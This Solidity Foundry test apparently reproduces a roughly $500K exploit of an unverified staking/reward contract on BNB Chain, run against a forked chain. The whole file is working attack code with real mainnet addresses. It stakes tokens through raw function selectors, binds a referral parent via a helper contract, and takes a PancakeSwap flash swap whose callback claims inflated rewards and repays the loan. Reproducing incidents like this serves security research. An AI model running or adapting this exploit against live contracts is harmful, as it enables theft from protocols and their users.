// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$500K
// Attacker : https://bscscan.com/address/0xa9edec4496bd013dac805fb221edefc53cbfaf05
// Attack Contract : https://bscscan.com/address/0x791626eb05e60fac973646ac8d67b008b939fe88
// Victim Contract : https://bscscan.com/address/0x431abb27dab05f4e7cdeaa18390fe39364197500
// Attack Tx (Claim) : https://explorer.phalcon.xyz/tx/bsc/0xbeea4ff215b15870e22ed0e4d36ccd595974ffd55c3d75dad2230196cc379a52
// Attack Tx (Stake) : https://explorer.phalcon.xyz/tx/bsc/0xb650e9f4b9eb023ea65b55ca4d088323e3d5bda377880dedb149a7fd3fd5c15f

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1730625352953901123

interface IBUSDT_MetaWin {
    function buy(uint256 amount) external;
}

interface IBindingContract {
    function bindParent(address parent) external;
}

contract ContractTest is Test {
    IERC20 private constant BUSDT =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant FCN =
        IERC20(0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08);
    IERC20 private constant KLEN =
        IERC20(0x05CbF8417401028dE10d6B949061336dF8233a9f);
    IERC20 private constant TRUST =
        IERC20(0x31952292c193c05AE91e19456312E2Be1419c040);
    IERC20 private constant MDAO =
        IERC20(0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950);
    Uni_Pair_V2 private constant FCN_BUSDT =
        Uni_Pair_V2(0xACB496dd4A8b6B9D1B99D422b8700F6EF932Bc10);
    IBUSDT_MetaWin private constant BUSDT_MetaWin =
        IBUSDT_MetaWin(0x90bf82c772f16651d6ae51D42c90c84aE703Eb42);
    IBindingContract private constant BindingContract =
        IBindingContract(0x04c5bcFcae55591D72E01c548863F4E754C74339);
    address private constant vulnContract =
        0x431Abb27dAB05f4E7cDeAA18390fE39364197500;
    address private constant addrToBind =
        0x041285A02A7fabc448893f6c1766e4B592f46f96;

    function setUp() public {
        vm.createSelectFork("bsc", 33972111);
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(FCN), "FCN");
        vm.label(address(KLEN), "KLEN");
        vm.label(address(TRUST), "TRUST");
        vm.label(address(MDAO), "MDAO");
        vm.label(address(FCN_BUSDT), "FCN_BUSDT");
        vm.label(address(BUSDT_MetaWin), "BUSDT_MetaWin");
        vm.label(address(BindingContract), "BindingContract");
        vm.label(vulnContract, "vulnContract");
        vm.label(addrToBind, "addrToBind");
    }

    function testExploit() public {
        // Exploiter transfer to attack contract following amounts of tokens (for staking) before attack:
        deal(
            address(TRUST),
            address(this),
            171_150_509_328_412_454 + 283_615_706_379_311_069
        );
        deal(
            address(KLEN),
            address(this),
            2_848 * 1e18 + 2_999_999_999_999_999_999_999
        );
        deal(
            address(MDAO),
            address(this),
            360_000_000_000_000_004_830 + 2_700_000_000_000_000_007_354
        );
        deal(address(FCN), address(this), 190e12);
        deal(
            address(BUSDT),
            address(this),
            400e18 + 780_008_559_000_000_000_000
        );

        emit log_named_decimal_uint(
            "Exploiter BUSDT balance before attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter FCN balance before attack",
            FCN.balanceOf(address(this)),
            FCN.decimals()
        );

        // Approving tokens to vulnerable, unverified contract
        setApprovals();

        // Stake tokens TX
        BUSDT_MetaWin.buy(7_690);
        BindingContract.bindParent(addrToBind);
        (bool success, ) = vulnContract.call(
            abi.encodeWithSelector(bytes4(0x1f6b08a4), 1)
        );
        require(
            success,
            "Call to func with selector 0x1f6b08a4 not successful"
        );
        (success, ) = vulnContract.call(
            abi.encodeWithSelector(bytes4(0x61b761d5), 200e18)
        );
        require(
            success,
            "Call to func with selector 0x61b761d5 not successful"
        );

        HelperExploitContract helper = new HelperExploitContract();
        transferTokens(address(helper));
        helper.exploit();

        // Claim tokens TX
        vm.roll(33972130);
        FCN_BUSDT.swap(
            0,
            BUSDT.balanceOf(address(FCN_BUSDT)) - 20e15,
            address(this),
            abi.encode(0)
        );
        emit log_named_decimal_uint(
            "Exploiter BUSDT balance after attack",
            BUSDT.balanceOf(address(this)),
            BUSDT.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter FCN balance after attack",
            FCN.balanceOf(address(this)),
            FCN.decimals()
        );
    }

    function pancakeCall(
        address _sender,
        uint _amount0,
        uint _amount1,
        bytes calldata _data
    ) external {
        // Claim rewards in this call:
        (bool success, ) = vulnContract.call(
            abi.encodeWithSelector(bytes4(0xd9574d4c))
        );
        require(
            success,
            "Call to func with selector 0xd9574d4c not successful"
        );

        // Repaying flashloan
        BUSDT.transfer(address(FCN_BUSDT), 10_000 * 1e18);
        FCN.transfer(address(FCN_BUSDT), 100e18);
    }

    function setApprovals() internal {
        KLEN.approve(vulnContract, type(uint256).max);
        TRUST.approve(vulnContract, type(uint256).max);
        MDAO.approve(vulnContract, type(uint256).max);
        FCN.approve(vulnContract, type(uint256).max);
        BUSDT.approve(address(BUSDT_MetaWin), type(uint256).max);
    }

    function transferTokens(address to) internal {
        KLEN.transfer(to, KLEN.balanceOf(address(this)) / 2);
        TRUST.transfer(to, TRUST.balanceOf(address(this)) / 2);
        MDAO.transfer(to, MDAO.balanceOf(address(this)) / 2);
        FCN.transfer(to, FCN.balanceOf(address(this)) / 2);
        BUSDT.transfer(to, BUSDT.balanceOf(address(this)) / 2);
    }
}

contract HelperExploitContract is Test {
    IERC20 private constant BUSDT =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant FCN =
        IERC20(0x0fEA057dB0e6b45fa1A0065Cd512150987F2AF08);
    IERC20 private constant KLEN =
        IERC20(0x05CbF8417401028dE10d6B949061336dF8233a9f);
    IERC20 private constant TRUST =
        IERC20(0x31952292c193c05AE91e19456312E2Be1419c040);
    IERC20 private constant MDAO =
        IERC20(0x6cc1eACe0794bcc5852c7Ff70656c4dF0F02d950);
    IBUSDT_MetaWin private constant BUSDT_MetaWin =
        IBUSDT_MetaWin(0x90bf82c772f16651d6ae51D42c90c84aE703Eb42);
    IBindingContract private constant BindingContract =
        IBindingContract(0x04c5bcFcae55591D72E01c548863F4E754C74339);
    address private constant vulnContract =
        0x431Abb27dAB05f4E7cDeAA18390fE39364197500;

    function exploit() external {
        setApprovals();
        BUSDT_MetaWin.buy(6_069);
        BindingContract.bindParent(msg.sender);
        (bool success, ) = vulnContract.call(
            abi.encodeWithSelector(bytes4(0x1f6b08a4), 1)
        );
        require(
            success,
            "Call to func with selector 0x1f6b08a4 not successful"
        );
        (success, ) = vulnContract.call(
            abi.encodeWithSelector(bytes4(0x61b761d5), 200e18)
        );
        require(
            success,
            "Call to func with selector 0x61b761d5 not successful"
        );
    }

    function setApprovals() internal {
        KLEN.approve(vulnContract, type(uint256).max);
        TRUST.approve(vulnContract, type(uint256).max);
        MDAO.approve(vulnContract, type(uint256).max);
        FCN.approve(vulnContract, type(uint256).max);
        BUSDT.approve(address(BUSDT_MetaWin), type(uint256).max);
    }
}
